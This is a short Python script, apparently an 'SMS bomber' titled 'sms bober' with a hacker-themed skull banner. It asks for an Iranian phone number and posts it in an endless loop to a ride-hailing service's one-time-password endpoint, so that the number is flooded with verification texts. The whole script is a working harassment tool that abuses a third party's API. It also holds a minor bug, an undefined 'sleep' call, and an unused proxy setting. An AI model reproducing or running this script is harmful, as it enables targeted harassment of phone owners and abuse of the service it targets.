import time
import requests

def print_slow(txt):
    for x in txt:                     # cycle through the text one character at a time
        print(x, end='', flush=True)  # print one character, no new line, flush buffer
        sleep(0.1)
    print() # go to new line
print('''
\033[92m 
💻hacker💻pytror💻

                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$    💢  `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*""
.....   -~~:<` !    ~?T#$$@@W@*?$$   💢  /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!       💻h̷a̷c̷k̷e̷r̷💻
$R@i.~~ !     :   ~$$$$$B$$en:``       ⛔️sms bober⛔️
?MXT@Wx.~    :     ~"##*$$$$M~          💻pytror💻

 ''')
print('''\033[92m 💻hacker💻pytror💻 \033[97m''')
 
url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
num = input ('enter the number :')




my_data= {"cellphone":"+98"+num}



while True:
    send = requests.post(url , data=my_data)
    print(send)
    proxy = {"https":"127.0.0.1:8000"}
    time.sleep(1)